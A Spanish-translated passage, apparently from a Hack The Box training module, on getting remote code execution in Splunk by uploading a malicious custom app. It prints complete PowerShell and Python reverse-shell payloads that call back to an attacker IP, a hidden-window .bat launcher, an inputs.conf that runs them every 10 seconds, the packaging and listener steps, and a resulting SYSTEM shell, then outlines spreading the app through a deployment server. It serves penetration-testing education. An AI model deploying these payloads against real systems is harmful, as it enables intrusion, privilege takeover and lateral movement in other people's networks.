# Attacking Splunk

Como se discutió en la sección anterior, podemos obtener la ejecución de código remoto en Splunk creando una aplicación personalizada para ejecutar scripts de Python, Batch, Bash o PowerShell. Desde el escaneo NMAP Discovery, notamos que nuestro objetivo es un servidor de Windows. Dado que Splunk viene con Python instalado, podemos crear una aplicación Splunk personalizada que nos brinde ejecución de código remoto usando Python o un script PowerShell.

---

# **Abusar de la funcionalidad incorporada**

Podemos usar[este](https://github.com/0xjpuff/reverse_shell_splunk)Paquete Splunk para ayudarnos. El`bin`El directorio en este repositorio tiene ejemplos para[Pitón](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py)y[Powershell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Caminemos por este paso a paso.

Para lograr esto, primero necesitamos crear una aplicación Splunk personalizada utilizando la siguiente estructura del directorio.

Atacando a Splunk

```
xnoxos@htb[/htb]$ tree splunk_shell/splunk_shell/
├── bin
└── default

2 directories, 0 files

```

El`bin`El directorio contendrá cualquier scripts que pretendamos ejecutar (en este caso, un shell inverso de PowerShell), y el directorio predeterminado tendrá nuestro`inputs.conf`archivo. Nuestra caparazón inversa será una línea de una línea de PowerShell.

Atacando a Splunk

```powershell
#A simple and small reverse shell. Options and help removed to save space. #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

El[Entrada.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf)El archivo le dice a Splunk qué script ejecutar y cualquier otra condición. Aquí establecemos la aplicación como habilitada y le diremos a Splunk que ejecute el script cada 10 segundos. El intervalo siempre está en segundos, y la entrada (script) solo se ejecutará si esta configuración está presente.

Atacando a Splunk

```
xnoxos@htb[/htb]$ cat inputs.conf [script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10

```

Necesitamos el archivo .bat, que se ejecutará cuando la aplicación se implementa y ejecute la línea PowerShell One-Liner.

Atacando a Splunk

```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit

```

Once the files are created, we can create a tarball or `.spl` file.

Atacando a Splunk

```
xnoxos@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf

```

El siguiente paso es elegir`Install app from file`y cargar la aplicación.

![](https://academy.hackthebox.com/storage/modules/113/install_app.png)

Antes de subir la aplicación personalizada maliciosa, comencemos a un oyente usando NetCat o[socat](https://linux.die.net/man/1/socat).

Atacando a Splunk

```
xnoxos@htb[/htb]$ sudo nc -lnvp 443listening on [any] 443 ...

```

En el`Upload app`página, haga clic en navegar, elija el tarball que creamos antes y haga clic en`Upload`.

![](https://academy.hackthebox.com/storage/modules/113/upload_app.png)

Tan pronto como cargamos la aplicación, se recibe un shell inverso, ya que el estado de la aplicación se cambiará automáticamente`Enabled`.

Atacando a Splunk

```
xnoxos@htb[/htb]$ sudo nc -lnvp 443listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145

PS C:\Windows\system32> whoami

nt authority\system

PS C:\Windows\system32> hostname

APP03

PS C:\Windows\system32>

```

En este caso, recuperamos un caparazón como`NT AUTHORTY\SYSTEM`. Si se tratara de una evaluación del mundo real, podríamos proceder a enumerar el objetivo de las credenciales en el registro, la memoria o almacenar en otros lugares del sistema de archivos para usar para el movimiento lateral dentro de la red. Si este fuera nuestro punto de apoyo inicial en el entorno de dominio, podríamos usar este acceso para comenzar a enumerar el dominio de Active Directory.

Si estuviéramos lidiando con un host de Linux, necesitaríamos editar el`rev.py`Script de Python antes de crear el tarball y subir la aplicación maliciosa personalizada. El resto del proceso sería el mismo, y obtendríamos una conexión de shell inversa en nuestro oyente de Netcat y nos iríamos a las carreras.

Código:pitón

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')

```

Si el host Splunk comprometido es un servidor de implementación, es probable que sea posible lograr RCE en cualquier host con los reenviados universales instalados en ellos. Para empujar una carcasa inversa a otros hosts, la aplicación debe colocarse en el`$SPLUNK_HOME/etc/deployment-apps`Directorio en el host comprometido. En un entorno de Windows-Heavy, necesitaremos crear una aplicación utilizando un shell inverso de PowerShell ya que los reenviadores universales no se instalan con Python como el servidor Splunk.